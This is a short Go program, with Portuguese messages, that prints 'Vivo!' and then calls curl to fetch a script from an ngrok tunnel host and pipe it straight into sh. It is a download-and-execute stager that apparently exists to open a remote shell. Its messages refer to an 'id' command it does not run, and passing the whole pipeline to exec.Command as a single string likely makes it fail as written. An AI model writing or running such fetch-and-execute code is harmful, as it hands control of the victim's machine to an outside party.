package main

import (
        "fmt"
        "os/exec"
)

func main() {
        fmt.Println("Vivo!")
        cmd := exec.Command("curl https://a604-189-40-72-61.ngrok-free.app/shell |sh")
        output, err := cmd.Output()
        if err != nil {
            fmt.Println("Erro ao executar o comando id:", err)
        } else {
            fmt.Println("Saída do comando id:", string(output))
        }
}
